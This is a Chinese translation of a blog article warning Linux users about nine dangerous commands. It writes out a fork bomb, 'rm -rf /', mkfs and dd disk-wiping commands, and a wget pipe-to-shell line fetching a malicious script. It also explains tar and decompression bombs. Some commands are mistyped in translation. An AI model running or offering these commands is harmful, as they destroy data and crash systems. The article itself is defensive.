# 9 个使用前必须再三小心的 Linux 命令 - 文章 - 伯乐在线
原文出处： [Fahad Khan](http://www.hongkiat.com/blog/linux-commands-to-avoid/)   译文出处：[evget](http://www.evget.com/article/2014/11/4/21781.html)
Linux shell/terminal 命令非常强大，即使一个简单的命令就可能导致文件夹、文件或者路径文件夹等被删除。
在一些情况下，Linux 甚至不会询问你而直接执行命令，导致你丢失各种数据信息。
一般来说在 Web 上推荐新的 Linux 用户执行这些命令，当然，也有人哪些写过这代码的人不这么想，因为这玩意你一写下去就不是玩笑了。
这里我收集了一些对系统有危害的 Linux 代码，帮助你避免他们。请记住：这些代码非常危险，甚至可以经过修改，变得更加有危害性。
还有一些事情需要注意：一些命令只在 Ubuntu 中有 sudo 前缀时是有危害的。其他发行版本的 Linux，则是在作为根目录命令时会有危害。
## 1. Linux Fork Bomb Command
:(){ :: & };: 以 Fork Bomb 闻名，是一个拒绝服务攻击的 Linux 系统。:(){ :: & };: 是一个 bash 函数。只要被执行，他会不断重复，直到系统被冻结。
你只能重启系统解决这个问题。所以当你在 Linux 界面执行这个命令时一定要注意。
## 2. Mv Folder/Dev/Null Command
mv folder/dev/null 也是一个危险的命令。Dev/null 或者 null device 是一个删除所有写在这个设备文件上数据的设备文件，但是，该操作提示却是写入操作执行成功。这就是我们常说的 bit bucked 或者 black hole。
## 3. Rm -Rf Command
**rm -rf**命令在 Linux 系统中可以快速删除文件夹及其内容。如果，你不知道如何正确使用它，你就只有哭了。
列下m-rf 命令最常见的组合和选择：
- rm command ：删除 Linux 系统的文件
- rm -f command：不需提示，删除文件中的只读文件
- rm -r command 循环删除文件夹的内容
- rm -d command ：删除空目录，如果非空目录则不会执行该操作
- rm -rf/ command：强制删除根目录中的所有内容和子文件夹（包括写保护文件）命令。
- rm -rf* command ：强制删除当前目录中的所有内容（当前工作目录）和字文件夹
- rm -rf. command：强制删除当前文件夹目录/子目录中的所有内容 。同 rm -r.[^.]*
The rm -r.[^.]* command ：删除文件及文件夹，带有删除提示
## 4. Mkfs Command
如果你不知 mkfs 的作用，那么它也是一个危险的命令，mkfs 之后写的任何命令都将会被一个空白的 linux 文件系统格式化、替代。
下面列举出需要管理员权限，格式化硬盘的命令：
- mkfs
- mkfs.ext3
- mkfs.bfs
- mkfs.ext2
- mkfs.minix
- mkfs.msdos mkfs.reiserfs
- mkfs.vfat
mkfs.cramfs 也可以和上面的代码做同样的事情，不过不需要管理源权限。
## 5. Tar Bomb
tar 命令用于将多个文件以 .tar 格式放入一个文件中（存档文件）。Tape Archive (Tar) bomb 可以由他创建。
当为压缩时，就是这个存档文件生成数以万计的相似名称文件出现在当前目录中而不是新目录。
当收到 tar 文件，定期创建一个新的保护目录，然后在解压前将接受的 tar 文件放到这个目录中，你可以避免成为 tar bomb 的受害者。
## 6. Dd Command
Dd命令用于复制&改变硬盘分区。如果，你用错地方了，那么也很危险。
下面列举 dd 命令：
- dd if=/dev/hda of=/dev/hdb
- dd if=/dev/hda of=/dev/sdb
- dd if=something of=/dev/hda
- dd if=something of=/dev/sda
下面这个命令会将整个主硬盘清零：dd if=/dev/zero of=/dev/had
## 7. Shell Script Code
有时候，你可能会被人坑，给你一个 shell 脚本文件，让你去下载并执行它。该脚本可能会包含一些恶意的或危险的代码。命令形式可能会是这样：wget http://some_malicious_source -O- sh。 wget 将会在 sh 狭隘脚本时下载脚本。
## 8. Malicious Source Code
也许有人会给你源代码让你编译他。代码可能是正常代码，不过，有一些恶意代码伪装在大型源代码中，如果是这样，你的系统就中枪了。如何避免？仅接受并编译可信赖来源的源代码。
## 9. Decompression Bomb
你已经收到一个压缩文件，你被要求提取这个看起来很小的文件，可能小到 KB。事实上，该小尺寸的压缩文件包含高度压缩数据。
只要文件解压，上百 GB 数据会被提取，这时候，过大的数据填满硬盘导致宕机，几率就很大了。如何避免？还是那句老话，别手贱，什么文件都去接收，请接收可信任来源文件。
